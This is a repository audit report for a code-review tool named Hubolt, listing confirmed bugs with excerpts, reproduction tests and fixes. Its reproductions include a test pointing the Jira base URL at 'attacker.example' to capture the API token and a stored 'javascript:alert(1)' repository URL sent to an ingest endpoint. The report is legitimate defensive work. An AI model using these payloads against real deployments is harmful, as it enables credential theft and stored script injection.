# Hubolt Repository Bug Audit

Date: 2026-06-20
Scope: exhaustive tracked-file audit of runtime-affecting code, configs, workflows, schema, migrations, tests, fixtures, build tooling, web UI, and operational documentation in `/Users/rithikmeedinti/Hubot`.

## Verification Commands

- `npm run typecheck`: passed in this workspace.
- `npm test`: passed, 59 test files and 444 tests.
- `npx prisma validate`: passed.
- `npm run db:check-drift`: not verified. It failed before comparing migrations because `SHADOW_DATABASE_URL` is unset.
- `git ls-files --error-unmatch src/version.ts`: failed; `src/version.ts` is used by tracked source but is untracked.
- `git ls-files --error-unmatch .github/workflows/ci.yml`: failed; the CI workflow that sets `SHADOW_DATABASE_URL` is untracked.
- `z.string().url()` behavior was checked locally and accepts `javascript:alert(1)`, `data:text/html,hi`, `ftp://example.com/x`, and `https://github.com/a/b`.

Passing checks are not treated as proof of correctness. They are listed only as verification context.

## Coverage Summary

- Tracked files accounted for: 279.
- Tracked non-binary files reviewed or categorized: 269.
- Source/config/docs/tests/runtime text files reviewed: 268; `review.json` is tracked but treated as a generated follow-up artifact.
- Binary assets skipped: 10 font files, reason: static binary assets with no executable behavior.
- Generated or generated-like artifacts requiring follow-up: `src/generated/prisma/**` is ignored and present locally with 44 files; `review.json` is a generated report artifact checked into the tree.
- Untracked behavior-affecting files found: `.github/workflows/ci.yml`, `src/version.ts`, and several new tests.
- Dirty worktree: many tracked files are modified before this audit. I did not revert or normalize unrelated changes.

## Coverage Log

Status key: reviewed means inspected for runtime behavior or operational contract; skipped means no runtime behavior; follow-up means generated, binary, untracked, or externally unverifiable.

| Area | Files accounted for | Status | Notes |
| --- | --- | --- | --- |
| Root project config | `.gitignore`, `.hubolt.example.yml`, `.hubolt.yml`, `.npmignore`, `LICENSE`, `README.md`, `docker-compose.yml`, `package.json`, `package-lock.json`, `prisma.config.ts`, `tsconfig.json`, `tsconfig.build.json` | reviewed | Build scripts, ignored generated files, Prisma env loading, dependency manifests, and package entrypoints reviewed. |
| GitHub automation | `.github/actions/review/README.md`, `.github/actions/review/action.yml`, `.github/actions/review/utils.cjs`, `.github/workflows/hubolt.yml` | reviewed | Composite action, PR comment manager, cache, artifact upload, and workflow trigger behavior reviewed. |
| Untracked automation | `.github/workflows/ci.yml` | follow-up | Present locally and relevant, but not tracked; cannot be counted as repository CI protection. |
| Docs | `docs/BUDGETS_AND_LIMITS.md`, `docs/CLI_COMMANDS.md`, `docs/CONTROL_PANEL.md`, `docs/CRITICAL_FIXES.md`, `docs/PHASE5_STEP1_GATEWAY.md`, `docs/PHASE5_WEBHOOKS_QUEUE.md`, `docs/PHASE7_INTEGRATIONS.md`, `docs/SERVER_SETUP.md` | reviewed | Treated as operational where they define setup, model IDs, gateway behavior, secrets, and release gates. |
| Example fixture | `examples/bad-users-api.ts` | reviewed | Test/example vulnerable code only; no production path. |
| Prisma | `prisma/schema.prisma`, `prisma/migrations/0001_init/migration.sql` through `0015_api_key_member/migration.sql`, `prisma/migrations/migration_lock.toml` | reviewed | Schema validates; drift equivalence not verified due missing shadow DB. |
| Build script | `scripts/postbuild.mjs` | reviewed | Confirms generated Prisma runtime files are copied after build. |
| CLI | `src/cli/index.ts`, `src/cli/errors.ts`, `src/cli/help.ts`, `src/cli/server-client.ts`, `src/cli/spinner.ts`, `src/cli/starter-config.ts`, `src/cli/ui.ts`, `src/cli/commands/analyze.ts`, `audit.ts`, `cache.ts`, `config.ts`, `eval.ts`, `feedback.ts`, `gateway.ts`, `github.ts`, `history.ts`, `integrations.ts`, `issues.ts`, `logs.ts`, `memory.ts`, `providers.ts`, `push-report.ts`, `report.ts`, `review.ts`, `server.ts`, `setup.ts`, `webhooks.ts`, `worker.ts` | reviewed | Review, push-report, issue creation, gateway, server bootstrap, worker startup, config validation, and command error handling traced. |
| Config | `src/config/defaults.ts`, `env-file.ts`, `env.ts`, `index.ts`, `repo-config.ts`, `resolve.ts`, `schema.ts` | reviewed | Config merge, schema defaults, env handling, secret naming, and repo-controlled integration config reviewed. |
| Core review engine | `src/core/analyze.ts`, `cache.ts`, `context-builder.ts`, `diff.ts`, `event-log.ts`, `events.ts`, `git.ts`, `index.ts`, `llm-cache.ts`, `patterns.ts`, `pipeline.ts`, `prompt.ts`, `rank.ts`, `redact.ts`, `safe-cache.ts`, `semantic-map.ts`, `single-file-reviewer.ts`, `validators.ts` | reviewed | Inputs, validation, file traversal, caching, fingerprints, redaction, analyzer/LLM merging, and single-file review path traced. |
| Eval | `src/eval/fixtures.ts`, `runner.ts`, `score.ts` | reviewed | Fixture loading, scoring, and evaluation runner paths reviewed. |
| Feedback | `src/feedback/github.ts` | reviewed | GitHub comment feedback extraction traced into memory paths. |
| GitHub posting | `src/github/comments.ts`, `line-mapping.ts`, `post.ts`, `suggestions.ts` | reviewed | Inline comment dedupe, line mapping, suggestions, and posting failure handling reviewed. |
| Integrations | `src/integrations/asana.ts`, `clickup.ts`, `env-names.ts`, `event.ts`, `issue-registry.ts`, `issues.ts`, `jira.ts`, `registry.ts`, `slack.ts`, `teams.ts`, `types.ts` | reviewed | Notification and issue-tracker targets, secret sources, redaction, payload capping, and remote calls traced. |
| Memory | `src/memory/apply.ts`, `calibration.ts`, `cards.ts`, `feedback-types.ts`, `retrieval.ts`, `suppression.ts` | reviewed | Suppression, calibration, memory-card retrieval, and confidence adjustments traced. |
| Providers | `src/providers/index.ts`, analyzers under `src/providers/analyzers/**`, LLM providers under `src/providers/llm/**`, GitHub SCM under `src/providers/scm/**` | reviewed | Analyzer execution, provider registry, LLM parsing, catalog defaults, GitHub API pagination, auth, and redaction reviewed. |
| Queue | `src/queue/review-context.ts`, `review-jobs.ts`, `review-processor.ts`, `worker.ts` | reviewed | Webhook-to-job flow, dedupe keys, retries, stale-head skips, DB transaction, comment posting, integrations, and cleanup traced. |
| Reports | `src/report/build.ts`, `index.ts`, `json.ts`, `markdown.ts` | reviewed | Report serialization, model-cost lookup, markdown rendering, and version imports reviewed. |
| Server base | `src/server/api-keys.ts`, `app.ts`, `db.ts`, `index.ts`, `redis.ts`, `middleware/auth.ts`, `middleware/error-handler.ts` | reviewed | Server registration, auth roles, key hashing, Redis optionality, DB lifecycle, and uncaught error response reviewed. |
| Server routes | `src/server/routes/audit.ts`, `budgets.ts`, `feedback.ts`, `gateway.ts`, `github-repos.ts`, `health.ts`, `history.ts`, `ingest.ts`, `memory.ts`, `orgs.ts`, `rate-limits.ts`, `ui.ts`, `webhooks.ts` | reviewed | Auth, authorization, validation, writes, transactions, read APIs, webhook signature checks, and UI serving traced. |
| Server services | `src/server/services/budget-manager.ts`, `budget.ts`, `constants.ts`, `cost-estimator.ts`, `credential-manager.ts`, `errors.ts`, `feedback.ts`, `gateway-logger.ts`, `github-app.ts`, `llm-gateway.ts`, `memory.ts`, `model-catalog.ts`, `model-router.ts`, `request-queue.ts`, `types.ts`, `validation.ts` | reviewed | Gateway routing, request queue, persistent reservations, refunds, rate limits, encrypted credentials, audit logging, memory, and model catalog traced. |
| Server webhook helpers | `src/server/webhooks/payload.ts`, `signature.ts` | reviewed | HMAC validation and PR action parsing reviewed. |
| Public types | `src/types/events.ts`, `finding.ts`, `index.ts`, `providers.ts`, `reports.ts`, `review-context.ts` | reviewed | Cross-module contracts and report/event shapes checked against route and test usage. |
| Tests | All tracked tests under `test/cli`, `test/config`, `test/core`, `test/eval`, `test/feedback`, `test/github`, `test/integrations`, `test/memory`, `test/providers`, `test/queue`, `test/report`, `test/server`, and root `test/github-action-utils.test.ts` | reviewed | Assertions and mocks inspected for gaps around failure modes, security boundaries, generated artifacts, and test-vs-production drift. |
| Fixtures | `test/fixtures/eval/*.json`, `test/fixtures/webhooks/pull-request-opened.json` | reviewed | Used as parser/webhook fixtures only. |
| Web app | `web/index.html`, `web/styles.css`, `web/js/api.js`, `app.js`, `dom.js`, `fx.js`, `web/js/views/*.js` | reviewed | API calls, local API-key handling, DOM rendering, links, routes, and state transitions reviewed. |
| Landing page | `web/landing/index.html`, `landing.css`, `landing.js` | reviewed | Static marketing/runtime docs surface reviewed for operational model drift. |
| Fonts | `web/fonts/*.woff2`, `web/landing/fonts/*.woff2` | skipped | Binary font assets; no executable behavior. |
| Generated Prisma client | `src/generated/prisma/**` | follow-up | Ignored generated output exists locally and is imported by source. It is regenerated by `npm run build`, but `npm run typecheck` does not generate it. |
| Generated report artifact | `review.json` | follow-up | Checked-in generated review output. Used as evidence only where current source confirmed the issue; otherwise not treated as authoritative. |
| Untracked tests | `test/core/single-file-reviewer.test.ts`, `test/queue/worker-credentials.test.ts`, `test/server/gateway-routes.test.ts`, `test/server/orgs-key-roles.test.ts`, `test/server/orgs-management.test.ts`, `test/server/rate-limits-routes.test.ts` | follow-up | Present locally and executed by Vitest, but not tracked. They cannot be counted as repository coverage unless committed. |

## Runtime Paths And Integrations Traced

- Local review path: CLI config resolution, git diff/context building, analyzer execution, LLM provider calls, cache use, pipeline merging, report rendering, optional GitHub posting, optional integration dispatch.
- Push-report ingest path: `hubolt push-report` builds a payload, server `/ingest/review` authenticates admin API key, reserves budget, upserts repository/review/findings/model usage, refunds on failed transaction, and surfaces data through history/audit/UI routes.
- GitHub Action path: checkout/build/review/artifact upload/comment update through `.github/actions/review/action.yml` and `utils.cjs`.
- Webhook path: Fastify raw-body signature check, event parsing, GitHub App installation handling, repository scoping, queue job ID dedupe, worker stale-head checks, hosted context build, review transaction, comment posting, memory/feedback, and integrations.
- Gateway path: API auth, credential encryption/decryption, model routing, cache, queueing, persistent reservations, budget reservation/refund/reconciliation, request logs, rate limits, and status/model routes.
- Web control panel path: static UI, API-key storage, fetch wrapper, route views, DOM helper, repository links, budgets, org management, memory, feedback, gateway, and audit.
- External integrations: Slack, Teams, Jira, ClickUp, Asana, GitHub REST/App API, Redis/BullMQ, Prisma/Postgres, provider LLM SDKs, TypeScript/eslint/semgrep/npm audit analyzers.

## Confirmed Bugs

### 1. High: repo-controlled Jira base URL can receive the Jira API token

Path and lines:
- `src/config/schema.ts:48-73`
- `src/integrations/issue-registry.ts:21-31`
- `src/integrations/jira.ts:17-50`
- `src/cli/commands/issues.ts:33-70`
- `docs/PHASE7_INTEGRATIONS.md:100-104`

Excerpt:

```ts
// src/config/schema.ts
jira: z
  .object({
    enabled: z.boolean().default(false),
    baseUrl: z.string().default(""),
    projectKey: z.string().default(""),
    email: z.string().default(""),
    issueType: z.string().default("Task")
  })
```

```ts
// src/integrations/jira.ts
const base = (options.baseUrl ?? "").replace(/\/+$/, "");
const ready = Boolean(base && options.projectKey && options.email && options.apiToken);
...
const auth = Buffer.from(`${options.email}:${options.apiToken}`).toString("base64");
const response = await fetchImpl(`${base}/rest/api/2/issue`, {
  method: "POST",
  headers: { "content-type": "application/json", authorization: `Basic ${auth}` },
  body: JSON.stringify(payload)
});
```

Failure mechanism and impact: `.hubolt.yml` is repo-controlled, but it can set `integrations.jira.baseUrl` and `email`. When a developer or automation runs `hubolt issues create`, the CLI reads that config, combines it with `HUBOLT_JIRA_TOKEN`, and sends HTTP Basic auth to the configured host. A malicious repo or PR branch can point `baseUrl` at an attacker-controlled HTTPS endpoint and exfiltrate the Jira token. The docs correctly state repo config is untrusted for secret selection, but the remote destination is also part of the secret boundary.

Reproduction/minimal test:

```ts
const fetchImpl = vi.fn().mockResolvedValue({ ok: true, status: 201, json: async () => ({ key: "X-1" }) } as Response);
const target = createJiraTarget({
  baseUrl: "https://attacker.example",
  projectKey: "PROJ",
  email: "bot@example.com",
  apiToken: "secret",
  fetchImpl
});
await target.createIssue(draft);
expect(fetchImpl.mock.calls[0][0]).toBe("https://attacker.example/rest/api/2/issue");
expect(fetchImpl.mock.calls[0][1].headers.authorization).toBe(`Basic ${Buffer.from("bot@example.com:secret").toString("base64")}`);
```

Recommended fix:

```diff
- baseUrl: jira.baseUrl,
- email: jira.email,
+ baseUrl: env.HUBOLT_JIRA_BASE_URL?.trim(),
+ email: env.HUBOLT_JIRA_EMAIL?.trim(),
```

Also enforce `https://*.atlassian.net` or an explicit trusted allowlist, reject userinfo in URLs, disable redirects for authenticated calls where possible, and document that Jira destination config is trusted operator config, not repo config.

Existing coverage and missing test: `test/integrations/issues.test.ts:79-99` asserts Basic auth is sent to `https://acme.atlassian.net`, but there is no test that hostile/non-Atlassian hosts are rejected and no test that fetch is not called with credentials when the destination is untrusted.

### 2. High: ingested repository URLs accept unsafe schemes and are rendered as UI links

Path and lines:
- `src/server/routes/ingest.ts:18-24`
- `src/server/routes/ingest.ts:136-147`
- `src/server/routes/github-repos.ts:53-64`
- `web/js/views/github-repos.js:230-232`
- `web/js/dom.js:8-21`
- `src/cli/commands/push-report.ts:49-90`

Excerpt:

```ts
// src/server/routes/ingest.ts
repository: z.object({
  name: z.string(),
  fullName: z.string(),
  url: z.string().url()
})
...
url: payload.repository.url
```

```js
// web/js/views/github-repos.js
el("td", {}, el("a", { href: repo.url, target: "_blank", rel: "noreferrer", text: repo.fullName }))
```

Failure mechanism and impact: Zod's generic URL validator accepts schemes such as `javascript:`, `data:`, and `ftp:`. The server stores the value from `/ingest/review`; `/github-repos` returns it; the web UI sets it directly as an anchor `href`. Text is safely written through `textContent`, but URL attributes are not scheme-filtered. This creates a stored unsafe-link vector in the control panel and can lead to script execution or phishing when an admin clicks the repository link, depending on browser handling and CSP.

Reproduction/minimal test:

```ts
expect(z.string().url().safeParse("javascript:alert(1)").success).toBe(true);
```

Then POST `/ingest/review` with an admin API key and:

```json
{ "repository": { "name": "repo", "fullName": "owner/repo", "url": "javascript:alert(1)" } }
```

Open `/ui/#/repos`; the repository anchor receives that value as `href`.

Recommended fix:

```ts
const HttpUrlSchema = z.string().url().refine((value) => {
  const url = new URL(value);
  return url.protocol === "https:" || url.protocol === "http:";
}, "Repository URL must use http or https");
```

Use the schema in ingest and any repo-management write path. Add a client-side `safeHref` helper that omits or replaces links whose protocol is not `http:` or `https:`. If the view is GitHub-specific, require canonical GitHub URLs rather than arbitrary URLs.

Existing coverage and missing test: `test/server/routes-regression.test.ts:32-39` only uses an HTTPS repo URL. There is no test rejecting `javascript:`, `data:`, or `ftp:` in ingest, and there is no web view test asserting unsafe `href` values are not rendered.

### 3. High: clean checkout cannot build because tracked source imports untracked `src/version.ts`

Path and lines:
- `src/cli/index.ts:27`
- `src/report/build.ts:9`
- `package.json:52-61`
- `.gitignore:41-44`

Excerpt:

```ts
// src/cli/index.ts
import { HUBOLT_VERSION } from "../version.js";
```

```ts
// src/report/build.ts
import { HUBOLT_VERSION } from "../version.js";
```

Evidence:

```text
$ git ls-files --error-unmatch src/version.ts
error: pathspec 'src/version.ts' did not match any file(s) known to git
Did you forget to 'git add'?
```

Failure mechanism and impact: The current workspace typechecks because `src/version.ts` exists locally, but a clean checkout of tracked files does not contain it. Both CLI bootstrap and report building import `../version.js`, so `npm run typecheck` and `npm run build` will fail in a clean clone or release worker unless this file is generated by some external step. No tracked script generates it.

Reproduction/minimal test: In a clean checkout without untracked files, run `npm run typecheck` or `npm run build`. TypeScript will fail to resolve `../version.js`.

Recommended fix: Track `src/version.ts`, or replace the import with a tracked generated step in `prebuild` and `typecheck`. Add a CI guard that runs from a clean checkout and fails if tracked source imports files not present in `git ls-files`.

Existing coverage and missing test: Local `npm run typecheck` passes only because the untracked file exists. The untracked `.github/workflows/ci.yml` cannot be counted as protection. There is no test or CI check that detects imports satisfied only by untracked files.

### 4. Medium: GitHub Action can select a user-authored marker comment as the managed comment

Path and lines:
- `.github/actions/review/utils.cjs:1-15`
- `.github/actions/review/utils.cjs:51-78`
- `test/github-action-utils.test.ts:26-43`

Excerpt:

```js
const COMMENT_MARKER = "<!-- hubolt-review-comment -->";
...
async findExistingComment() {
  const comments = await this.getAllComments();
  return comments.find((c) => c.body?.includes(COMMENT_MARKER));
}
```

Failure mechanism and impact: `findExistingComment` trusts any issue comment containing the marker. A PR participant can post that marker before the action runs. The action will then treat the user comment as its managed comment and call `updateComment` with that comment ID. Depending on GitHub token permissions, this either overwrites a human comment or causes the action's PR comment update path to fail instead of creating its own comment.

Reproduction/minimal test:

```ts
listComments.mockResolvedValue({
  data: [
    { id: 1, body: `user text\n\n${COMMENT_MARKER}`, user: { type: "User", login: "alice" } },
    { id: 2, body: `bot report\n\n${COMMENT_MARKER}`, user: { type: "Bot", login: "github-actions[bot]" } }
  ]
});
expect((await manager.findExistingComment())?.id).toBe(2);
```

Current code returns `id: 1`.

Recommended fix: Filter comments by both marker and trusted author identity before returning. For GitHub Actions, require `c.user?.type === "Bot"` and an allowed bot login such as `github-actions[bot]`, or include a stronger hidden marker with workflow/repo identity and still prefer bot-authored comments.

Existing coverage and missing test: `test/github-action-utils.test.ts:26-43` checks null bodies and marker discovery, but does not cover a user-authored marker or author filtering.

### 5. Medium: gateway advertises retired Gemini model IDs

Path and lines:
- `src/server/services/model-catalog.ts:67-81`
- `src/server/routes/gateway.ts:180-205`
- `src/server/services/model-router.ts:81-94`
- `docs/PHASE5_STEP1_GATEWAY.md:96-98`
- `docs/CLI_COMMANDS.md:417-419`
- `web/landing/index.html:398-405`

Excerpt:

```ts
// src/server/services/model-catalog.ts
google: {
  "gemini-2.0-flash": {
    displayName: "Gemini 2.0 Flash",
    available: true
  },
  "gemini-1.5-pro": {
    displayName: "Gemini 1.5 Pro",
    available: true
  }
}
```

Failure mechanism and impact: `/gateway/models` returns the catalog entries whose `available` flag is true, and `ModelRouter` uses the same catalog for fallback choices. As of 2026-06-20, Google documents `gemini-2.0-flash` as shut down on 2026-06-01 and the Gemini API changelog says `gemini-1.5-pro` was shut down on 2025-09-29. New gateway traffic routed to these IDs will fail at the provider, and docs/UI still encourage bad configuration.

External source evidence:

- Google Gemini deprecations: `gemini-2.0-flash` shutdown date 2026-06-01 and recommended replacement `gemini-3.5-flash`: https://ai.google.dev/gemini-api/docs/deprecations
- Google Gemini API changelog: Gemini 1.5 models including `gemini-1.5-pro` shut down on 2025-09-29: https://ai.google.dev/gemini-api/docs/changelog

Reproduction/minimal test: GET `/gateway/models` with an authenticated key; the response includes Google entries for `gemini-2.0-flash` and `gemini-1.5-pro`. Configure a Google credential and route a request to either model; provider-side calls should fail because those model IDs are no longer active.

Recommended fix: Replace retired Google IDs with current supported model IDs from the official models/deprecations pages, mark retired IDs unavailable if backward compatibility matters, and align docs/landing copy with the runtime catalog. Add a date-sensitive catalog freshness check or provider smoke-test gate that fails on retired model IDs.

Existing coverage and missing test: `test/providers/catalog.test.ts:10-34` checks provider registration and env names, but not server gateway model validity or official deprecation status. There is no test asserting `/gateway/models` excludes retired IDs.

### 6. Low: unauthenticated readiness route leaks raw dependency errors

Path and lines:
- `src/server/routes/health.ts:42-48`
- `src/server/middleware/error-handler.ts:10-26`

Excerpt:

```ts
fastify.get("/ready", async (request, reply) => {
  try {
    await context.db.$queryRaw`SELECT 1`;
    reply.status(200).send({ ready: true });
  } catch (error) {
    reply.status(503).send({ ready: false, error: String(error) });
  }
});
```

Failure mechanism and impact: `/ready` is public and returns `String(error)` on database failure. Prisma/Postgres errors can include hostnames, connection details, SQL fragments, or operational internals. The `/health` route logs the error and returns structured state without the raw error, so `/ready` is the inconsistent leak.

Reproduction/minimal test:

```ts
const db = { $queryRaw: vi.fn().mockRejectedValue(new Error("connect ECONNREFUSED db.internal:5432")) };
const response = await app.inject({ method: "GET", url: "/ready" });
expect(response.json()).toEqual({ ready: false }); // desired
```

Recommended fix: Log the error server-side and return a generic body, for example `{ ready: false }` or `{ ready: false, error: "database unavailable" }`.

Existing coverage and missing test: There are tests for the CLI server client and DB disconnect behavior, but no route test for `/ready` success/failure responses and no assertion that internal errors are redacted.

## High-Confidence Likely Bugs

### 1. Medium: generated Prisma client is required by typecheck but not generated by `npm run typecheck`

Path and lines:
- `.gitignore:41-44`
- `package.json:52-61`
- imports such as `src/server/db.ts`, `src/server/services/model-router.ts`, and other server modules importing `../../generated/prisma/index.js`

Failure mechanism and impact: `src/generated/` is ignored, and source imports the generated Prisma client. `npm run build` has `prebuild: npx prisma generate`, but `npm run typecheck` is plain `tsc --noEmit`. In this workspace typecheck passes because `src/generated/prisma/**` exists locally. A clean checkout that runs `npm run typecheck` before `npx prisma generate` will fail. The untracked CI workflow does run `npx prisma generate` first, but it is not tracked and cannot be relied on.

Recommended fix: Add a `pretypecheck` script that runs `npx prisma generate`, or make `typecheck` call `prisma generate && tsc --noEmit`. Keep the generated client ignored, but make all first-run commands generate it consistently.

Missing test/gate: clean-checkout CI or a script test that removes generated output and verifies documented commands work.

## Risks Requiring Runtime Verification

### 1. Medium: migration drift gate is unavailable locally and non-blocking in an untracked workflow

Path and lines:
- `prisma.config.ts:17-22`
- `.github/workflows/ci.yml:51-58` (untracked)

Evidence:

```text
$ npm run db:check-drift
Error: You must set `datasource.shadowDatabaseUrl` in your `prisma.config.ts` if you want to diff a migrations directory.
```

Risk: Prisma schema syntax is valid, but migration drift could not be verified here. The local workflow file says drift is known and `continue-on-error: true`, but that workflow is untracked and therefore not a repository guarantee.

Required verification: run `npm run db:check-drift` with a throwaway Postgres `SHADOW_DATABASE_URL`, reconcile any reported drift, commit a blocking CI workflow, and make drift failure release-blocking.

### 2. Low: uncaught server errors may expose exception messages

Path and lines:
- `src/server/middleware/error-handler.ts:10-26`

Risk: The global Fastify error handler returns `error.message` for every status code, including 500s. Most route-level handlers sanitize known errors, but an unexpected exception in an authenticated or public route can expose implementation details. This needs runtime route-by-route fault injection to quantify.

Required verification: inject representative unexpected errors in public/authenticated routes and assert production responses use generic messages while logs retain detail.

## Findings Grouped By Severity

Critical:
- None confirmed.

High:
- Repo-controlled Jira base URL can receive the Jira API token.
- Ingested repository URLs accept unsafe schemes and are rendered as UI links.
- Clean checkout cannot build because tracked source imports untracked `src/version.ts`.

Medium:
- GitHub Action can select a user-authored marker comment as the managed comment.
- Gateway advertises retired Gemini model IDs.
- Generated Prisma client is required by typecheck but not generated by `npm run typecheck`.
- Migration drift gate is unavailable locally and non-blocking in an untracked workflow.

Low:
- Unauthenticated readiness route leaks raw dependency errors.
- Global error handler may expose unexpected exception messages.

## Unreviewed Or Unverifiable Areas

- `src/generated/prisma/**`: generated and ignored; reviewed only as an artifact boundary, not line-by-line source.
- Binary fonts under `web/fonts/**` and `web/landing/fonts/**`: skipped as static binary assets.
- Live provider calls to OpenAI, Anthropic, Google, Jira, Slack, Teams, ClickUp, Asana, and GitHub were not executed with real credentials.
- Migration drift could not be verified without `SHADOW_DATABASE_URL`.
- The untracked CI workflow and untracked tests were inspected but cannot be counted as repository behavior until tracked.
- Browser-specific execution of `javascript:` anchors should be verified in the supported browser matrix after server-side scheme validation is added. The unsafe storage/rendering path is confirmed independently.

## Top Five Fixes Before Release

1. Move Jira destination fields out of repo config or enforce a trusted allowlist before attaching `HUBOLT_JIRA_TOKEN`.
2. Restrict stored repository URLs to `http:` and `https:` at ingestion and sanitize link attributes in the web UI.
3. Track or generate `src/version.ts` as part of every clean-checkout command path.
4. Update the gateway model catalog and docs to remove retired Gemini IDs; add a catalog freshness test.
5. Commit and enforce CI that runs Prisma generation, typecheck, tests, and a blocking migration drift check against a shadow database.
